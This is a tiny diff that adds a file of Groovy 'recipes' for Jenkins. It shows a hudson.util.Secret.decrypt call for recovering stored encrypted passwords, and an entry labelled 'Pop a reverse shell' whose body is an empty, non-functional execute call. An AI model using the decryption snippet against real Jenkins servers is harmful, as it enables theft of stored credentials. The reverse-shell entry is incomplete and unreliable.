@@ -1,0 +1,7 @@
+Just a couple Groovy Recipes for doing fun stuff...
+
+# Decrypt a users encrypted password
+hudson.util.Secret.decrypt 'ENCRYPTED_PASSWORD'
+
+# Pop a reverse shell
+"".execute()
